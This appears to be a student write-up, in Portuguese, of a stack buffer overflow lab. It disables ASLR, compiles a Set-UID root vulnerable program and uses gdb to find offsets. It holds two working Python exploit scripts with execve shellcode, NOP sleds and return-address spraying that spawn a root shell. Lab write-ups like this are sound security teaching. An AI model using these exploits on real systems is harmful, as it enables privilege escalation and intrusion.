## Buffer Overflow

### Environment Setup 

Numa fase introdutoria, e para seguirmos as instruções dadas no guião, desligamos algumas proteções do Sistema Operativo, como por exemplo a randomização do espaço de endereços e a proibição ao nível da shell de ser executada por processos com Set-UID.
Esta etapa foi concluida com os seguintes comandos 
```c
$ sudo sysctl -w kernel.randomize_va_space=0
$ sudo ln -sf /bin/zsh /bin/sh
```

### Getting familiar with the shellcode 

Nesta fase, ainda introdutoria, foi executado um programa simples que abre a shellcode a partir da utilização do comando execve:

```c
char *name[2];
name[0] = "/bin/sh";
name[1] = NULL;
execve(name[0], name, NULL);
```
Este codigo foi testado para 32 e 64 bits. E em ambos os casos a shellcode abriu.

### Understanding the The Vulnerable Program 

Nesta etapa deparamo-nos com o problema que esta relacionado com este Lab, o bufferoverflow. Este bufferoverflow ocorre na função strcpy() visto que não é capaz de verificar os limites do buffer. Este buffer tem um limite de 100 bytes no entanto o array pode conter ate 517 bytes.

Para iniciarmos a exploração da vulnerabilidade realizamos os seguintes comandos: 

```c
$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
$ sudo chown root stack
$ sudo chmod 4755 stack
```

### LaunchingAttackon32-bitProgram(Level1)

Numa primeira fase da exploração da vulnerabilidade é necessario criar um ficheiro vazio com o nome badfile. De seguida iniciamos o nosso programa stack-L1-dbg em modo debug e definimos um breakpoint na função bof. A partir deste momento estamos aptos para iniciar o debug do nosso programa. Assim que chegarmos á função strcopy() devemos dar print do ebp e do buffer e de seguida da sua diferença para conhecermos o offset.
Tudo isto pode ser realizado com os seguintes comandos: 
```c
touch badfile // Criar o ficheiro badfile vazio
$ gdb stack-L1-dbg // Executar o programa em modo debug
...
gdb-peda$ b bof // Breakpoint na função bof
...
gdb-peda$ run // Executar o programa até chegar ao breakpoint
...
gdb-peda$ next // Avançar algumas intruções até que o registo ebp passe de apontar para a stack frame da função bof(), visto que antes ainda apontava para a stack frame da função que chamou bof()
...
gdb-peda$ p $ebp // Obter o valor de ebp
$1 = (void *) 0xffffcb98
gdb-peda$ p &buffer // Obter o endereço do início do buffer
$2 = (char (*)[100]) 0xffffcb2c
gdb-peda$ p/d 0xffffcb98 - 0xffffcb2c
$3 = 108

```


De seguida compilamos o seguinte ficheiro exploit.py com as seguintes alterações: 

```python3
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"    #This code is available in the shellcode folder -> 32 bits
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 256             # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    =  0xffffcb2c + 300          # Change this number  # Value of the &buffer + (a little jump) to enter in the area we attack
offset = 112              # Change this number   # Value of the difference between $ebp - $buffer = 108 + 4 = 112 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)

```

A seguir compilamos e corremos da seguinte forma: 

```c
./exploit.py
./stack-L1

```

Tendo obtido o seguinte resultado: 

![img](https://media.discordapp.net/attachments/1153998326274994216/1163450295716679700/acesso_terminal1.png?ex=653f9e86&is=652d2986&hm=efa60c57299bc7f4e1ba2acdf5413ad1bb35861d5f22fce6cd94b4d5ee577dd6&=&width=733&height=458)



### LaunchingAttackwithoutKnowingBufferSize(Level2)

Para esta tarefa, o procedimento acaba por ser muito semelhante ao da tarefa anterior simplesment nao conhecemos o ebp.
Dessa forma corremos os seguintes comandos : 

```c
gdb stack-L2-dbg 
gdb-peda$ b bof
gdb-peda$ run 
gdb-peda$ next
gdb-peda$ p &buffer
$1 = (char (*)[160]) 0xffffcaf0

```

De seguida executamos o seguinte codigo python3:

```python3

#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"        # This code is available in the shellcode folder -> 32 bits
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
#start = 256             # Change this number 
content[517 - len(shellcode):] = shellcode  # Starting at the top of the stack

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffcac0 + 400           # Value of the buffer +(little jump) to attack the zone that we want to 
#offset = 0              # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address

#Spray the buffer with return address 
for offset in range(50):
	content[offset * L :offset*4 + L] = (ret).to_bytes(L,byteorder='little')  # Spray to have the return address area in more places
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)

```

Para finalizar so temos que correr os seguintes comandos: 
```c
./exploit.py
./stack-L2
```

Tendo obtido acesso total a shellcode ! 
![img](https://cdn.discordapp.com/attachments/1153998326274994216/1163489494360670330/acesso_sudo_terminal_2.png?ex=653fc308&is=652d4e08&hm=4e581f8e67a326afd766dbe763b295e40d54887773f5ae55e44b955f13278333&)
